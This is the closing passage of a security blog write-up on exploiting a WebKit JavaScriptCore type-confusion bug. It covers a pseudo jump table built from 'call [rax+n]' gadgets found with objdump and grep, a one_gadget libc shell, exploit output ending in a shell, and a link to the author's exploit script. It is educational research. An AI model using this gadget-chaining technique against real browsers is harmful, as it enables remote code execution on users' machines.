<p>So, we have three constraints, and if we can satisfy any one of them, we’re done. Obviously the first is out -- we take control of PC with a <code>call [rax+0x48]</code> so <code>rax</code> cannot be <code>NULL</code>. So, now we’re looking at stack contents. Because nothing is ever easy, neither of the stack based constraints are met either. Since the easy solutions are out, let’s look at what we have in a little more detail.</p>
<h3 id="memory-layout-and-rop">Memory layout and ROP</h3>
<div class="highlight"><pre><span></span><code>       +------------------+
rax -&gt; |0xdeadbeefdeadbeef|
       +------------------+
       |        ...       |
       +------------------+
+0x48  |0x4141414141414141| &lt;- new rip
       +------------------+
</code></pre></div>


<p>To usefully take control of execution, we will need to construct an array with our target PC value at offset <code>+0x48</code>, then call our type confusion with that value. Because we can construct <code>ArrayWithDouble</code>’s arbitrary, this isn’t really a problem: populate the array, use our infoleak to find the array base, use that as the type confusion value.</p>
<p>A normal exploit path in this case will focus on getting a stack pivot and setting up a rop chain. In our case, if we wanted to try this the code we would need would be something like:</p>
<div class="highlight"><pre><span></span><code><span class="nf">mov</span> <span class="no">X</span><span class="p">,</span> <span class="p">[</span><span class="no">rdi</span><span class="p">]</span> <span class="c1">; or r15</span>
<span class="nf">mov</span> <span class="no">Y</span><span class="p">,</span> <span class="p">[</span><span class="no">X</span><span class="p">]</span>
<span class="nf">mov</span> <span class="no">rsp</span><span class="p">,</span> <span class="no">Y</span>
<span class="nf">ret</span>
</code></pre></div>


<p>Where X and Y can be any register. While some code with these properties likely exists inside some of the mapped executable code in our address  space, searching for it would require some more complicated tooling than I was familiar with or felt like learning. So ROP is probably out for now.</p>
<h3 id="reverse-gadgets">Reverse gadgets</h3>
<p>By this point we are very familiar with the fact that WebKit is C++, and C++ famously makes heavy use of function indirection much to the despair of reverse engineers and glee of exploit writers. Normally in a ROP chain we find snippets of code and chain them together, using <code>ret</code> to transfer control flow between them but that won’t work in this case. However, what if we could leverage C++’s indirection to get us the ability to execute gadgets. In our specific current case, we’re taking control of PC on a <code>call [rax + 0x48]</code>, with a fully controlled <code>rax</code>. Instead of looking for gadgets that end in <code>ret</code>, what if we look for gadgets that end in <code>call [rax + n]</code> and stitch them together.</p>
<div class="highlight"><pre><span></span><code>x@webkit:~$ objdump -M intel -d ~/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so \
    | grep &#39;call   QWORD PTR \[rax&#39; \
    | wc -l
7214
</code></pre></div>


<p>7214 gadgets is not a bad playground to choose from. Obviously <code>objdump</code> is not the best disassembler for this as it won’t find all instances (e.g. overlapping/misaligned instructions), but it should be good enough for our purposes. Let’s combine this idea with <code>one_gadget</code> constraints. We need a series of gadgets that:</p>
<ul>
<li>Zero a register</li>
<li>Write that register to <code>[rsp+0x28]</code> or <code>[rsp+0x58]</code></li>
<li>All of which end in a <code>call [rax+n]</code>, with each <code>n</code> being unique</li>
</ul>
<p>Why <code>+0x28</code> or <code>+0x58</code> instead of <code>+0x30</code> or <code>+0x60</code> like <code>one_gadget</code>’s output? Because the the final call into <code>one_gadget</code> will push the next PC onto the stack, offsetting it by 8. With a little bit of grepping, this was surprisingly easy to find. We’re going to search backwards, first, let’s go for the stack write.</p>
<div class="highlight"><pre><span></span><code>x@webkit:~$ objdump -M intel -d ~/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so \
    | grep -B1 &#39;call   QWORD PTR \[rax&#39; \
    | grep -A1 &#39;mov    QWORD PTR \[rsp+0x28\]&#39;
...
  5f6705:       4c 89 44 24 28          mov    QWORD PTR [rsp+0x28],r8
  5f670a:       ff 50 60                call   QWORD PTR [rax+0x60]
...
</code></pre></div>


<p>This find us four unique results, with the one we’ll use being the only one listed. Cool, now we just need to find a gadget to zero <code>r8</code>...</p>
<div class="highlight"><pre><span></span><code>x@webkit:~$ objdump -M intel -d ~/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so \
    | grep -B4 &#39;call   QWORD PTR \[rax&#39; \
    | grep -A4 &#39;xor    r8&#39;
…
  333503:       45 31 c0                xor    r8d,r8d
  333506:       4c 89 e2                mov    rdx,r12
  333509:       48 89 de                mov    rsi,rbx
  33350c:       ff 90 f8 00 00 00       call   QWORD PTR [rax+0xf8]
...
</code></pre></div>


<p>For this one, we need to broaden our search a bit, but still find what we need without too much trouble (and have our choice of five results, again with the one we’ll use being the only one listed). Again, <code>objdump</code> and <code>grep</code> are not the best tool for this job, but if it’s stupid and it works…</p>
<p>One takeaway from this section is that <code>libJavaScriptCore</code> is over 12mb of executable code, and this means your bigger problem is figuring what to look for as opposed to finding it. With that much code, you have an embarrassment of useful gadgets. In general, it made me curious as to the practical utility of fancy gadget finders on larger binaries (at least in case where the payloads don’t need to be dynamically generated).</p>
<p>In any case, we now have all the pieces we need to trigger and land our exploit.</p>
<h2 id="putting-it-all-together">Putting it all together</h2>
<p>To finish this guy off, we need to construct our pseudo jump table. We know we enter into our chain with a <code>call [rax+0x48]</code>, so that will be our first gadget, then we look at the offset of the call to determine the next one. This gives us a layout like this:</p>
<div class="highlight"><pre><span></span><code>       +------------------+
rax -&gt; |0xdeadbeefdeadbeef|
       +------------------+
       |       ...        |
       +------------------+
+0x48  |     zero r8      | &lt;- first call, ends in call [rax+0xf8]
       +------------------+
       |       ...        |
       +------------------+
+0x60  |    one gadget    | &lt;- third call, gets us our shell
       +------------------+
       |       ...        |
       +------------------+
+0xf8  |    write stack   | &lt;- second call, ends in call [rax+0x60]
       +------------------+
</code></pre></div>


<p>We construct this array using normal JS, then just chase pointers from leaks we have until we find the array. In my implementation I just used a magic 8 byte constant which I searched for, effectively performing a big <code>memmem()</code> on the heap. Once it’s all lined up, the dominoes fall and <code>one_gadget</code> gives us our shell :)</p>
<div class="highlight"><pre><span></span><code>x@webkit:~/babys-first-webkit$ ./jsc zildjian.js
setting up ghetto_memcpy()...
done:
function () {
    [native code]
}

setting up read primitives...
done.

leaking string addr...
string @ 0x00007feac5b96814

leaking jsc base...
reading @ 0x00007feac5b96060
libjsc .data leak: 0x00007feaca218f28
libjsc .text @ 0x00007feac95e8000
libc @ 0x00007feac6496000
one gadget @ 0x00007feac64d7c22

leaking butterfly arena...
reading @ 0x00007feac5b95be8
buttefly arena leak: 0x00007fea8539eaa0

searching for butterfly in butterfly arena...
butterfly search base: 0x00007fea853a8000
found butterfly @ 0x00007fea853a85f8

replacing array search tag with one shot gadget...
setting up take_rip...
done:
function format() {
    [native code]
}
setting up call target: 0x00007fea853a85b0
getting a shell... enjoy :)
$ id
uid=1000(x) gid=1000(x) groups=1000(x),27(sudo)
</code></pre></div>


<p>The exploit is here: <a href="https://gist.github.com/yrp604/5ef4996357e78da237be3727808174a0">zildjian.js</a>. Be warned that while it seems to be 100% deterministic, it is incredibly brittle and includes a bunch of offsets that are specific to my box. Instead of fixing the exploit to make it general purpose, I opted to provide all the info for you to do it yourself at home :)</p>
<p>If you have any questions, or if you have suggestions for better ways to do anything, be it exploit specifics or general approaches please (really) drop me a line on Twitter or IRC. As the length of this article might suggest, I’m happy to discuss this to death, and one of my hopes in writing this all down is that someone will see me doing something stupid and correct me.</p>
<h2 id="conclusion">Conclusion</h2>
<p>With the exploit working, let’s reflect on how this was different from common CTF problems. There are two difference which really stand out to me:</p>
<ul>
<li>The bug is more subtle than a typical CTF problem. This makes sense, as CTF problems are often meant to be understood within a ~48 hour period, and when you can have bigger/more complex systems you have more opportunity for mistakes like these.</li>
<li>CTF problems tend to scale up difficulty by giving worse exploit primitives, rather than harder bugs to find. We’ve all seen contrived problems where you get execution control in an address space with next to nothing in it, and need to MacGyver your way out. While this can be a fun and useful exercise, I do wish there were good ways to include the other side of the coin.</li>
</ul>
<p>Some final thoughts:</p>
<ul>
<li>This was significantly harder than I expected. I went in figuring I would have some fairly localized code, find a heap smash, relative write, or UaF and be off to the races. While that may be true for some browser bugs, in this case I needed a deeper understanding of browser internals. My suspicion is that this was not the easiest bug to begin browser exploitation with, but on the upside it was very… educational.</li>
<li>Most of the work here was done over a ~3 month period in my free time. The initial setup and research to get a working infoleak took just over a month, then I burned over a month trying to find a way to get an arbitrary write out of <code>fastMalloc</code>. Once I switched to <code>Intl.NumberFormat</code> I landed the exploit quickly.</li>
<li>I was surprised by how important object layouts were for exploitation, and how relatively poor the tooling was for finding and visualizing objects that could be instantiated and manipulated from the runtime.</li>
<li>With larger codebases such as this one, when dealing with an unknown component or function call I had the most consistent success balancing an approach of guessing what I viewed as likely behavior and reading and understanding the code in depth. I found it was very easy to get wrapped up in guessing how something worked because I was being lazy and didn’t want to read the code, or alternatively to end up reading and understanding huge amounts of code that ended up being irrelevant to my goals. </li>
</ul>
<p>Most of these points boil down to “more code to understand makes it more work to exploit”. Like most problems, once you understand the components the solution is fairly simple. With a larger codebase the most time by far was spent reading and playing with the code to understand it better.</p>
<p>I hope you’ve enjoyed this writeup, it would not have been possible without significant assistance from a bunch of people. Thanks to <a href="https://twitter.com/natashenka">@natashenka</a> for the bugs, <a href="https://twitter.com/agustingianni">@agustingianni</a> for answering over a million questions, <a href="https://twitter.com/5aelo">@5elo</a> and <a href="https://twitter.com/_niklasb">@_niklasb</a> for the Phrack article and entertaining my half-drunk questions during CanSec respectively, <a href="https://twitter.com/0vercl0k">@0vercl0k</a> who graciously listened to me rant about butterflies at least twenty times, <a href="https://twitter.com/itszn13">@itszn13</a> who is definitely the the best RPISEC alumnus of all time, and <a href="https://twitter.com/mongobug">@mongobug</a> who provided helpful ideas and shamed me into finishing exploit and writeup.</p>
                </div><!-- /.entry-content -->
        </article>
</section>
        </div><!--/span-->
      </div><!--/row-->
      <hr>

      <footer style='background-color:#00000000'>
        <center>
          <address id="about">
                  Proudly powered by <a href="http://pelican.notmyidea.org/">Pelican <i class="icon-external-link"></i></a>,
                                  which takes great advantage of <a href="http://python.org">Python <i class="icon-external-link"></i></a>.
          </address><!-- /#about -->

          <p>The theme is from <a href="http://twitter.github.com/bootstrap/">Bootstrap from Twitter <i class="icon-external-link"></i></a>,
                     and <a href="http://fortawesome.github.com/Font-Awesome/">Font-Awesome <i class="icon-external-link"></i></a>, thanks!</p>
        </center>
      </footer>

    </div><!--/.fluid-container-->


    <script src="../../../../../theme/js/jquery-1.7.2.min.js"></script>
    <script src="../../../../../theme/js/bootstrap.min.js"></script>
  </body>
</html>